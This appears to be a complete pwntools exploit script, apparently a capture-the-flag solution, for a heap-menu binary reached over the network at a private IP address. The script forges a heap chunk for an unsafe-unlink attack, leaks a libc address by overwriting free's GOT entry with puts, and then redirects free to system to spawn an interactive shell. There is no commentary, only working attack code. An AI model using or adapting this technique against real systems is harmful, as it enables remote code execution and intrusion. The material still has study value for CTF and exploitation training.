from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

t = remote('192.168.5.186',9999)
raw_input()
t.sendlineafter('$ ', '123')
def create(size, cun, content):
    t.sendlineafter('$ ', '1')
    t.sendlineafter('size\n', str(size))
    t.sendlineafter('cun\n', str(cun))
    t.sendlineafter('content\n',content)



def delete(index):
    t.sendlineafter('$ ', '2')
    t.sendlineafter('dele\n', str(index))



def edit(index,content):
     t.sendlineafter('$ ', '3')
     t.sendlineafter('edit\n',str(index))
     t.sendafter('content\n',content)





create(0x200,0,"/bin/sh\x00")
create(0x200,1,"1")
create(0x200,2,"2")
create(0x200,3,"3")
heap = 0x602100
delete(3)
delete(2)
payload = p64(0) + p64(0x200+1) + p64(heap- 0x18) + p64(heap - 0x10) + cyclic(480) + p64(0x200) + p64(0x200)
create(0x400,2,payload)
delete(3)
libc_atoi = 0x36e80
libc_system = 0x45390
libc_binsh = 0x18cd57
free_got = 0x602018
atoi_got = 0x602058
puts_plt = 0x4006d0
edit(2,'1'*0x18 + p64(free_got) + p64(1) + p64(atoi_got))
edit(2,p64(puts_plt))
delete(3)
atoi_addr = u64(t.recvn(6).ljust(8,'\x00'))
base_addr = atoi_addr - libc_atoi
system_addr = base_addr + libc_system
log.success("system: " + hex(system_addr))
edit(2,p64(system_addr))
delete(0)
t.interactive()




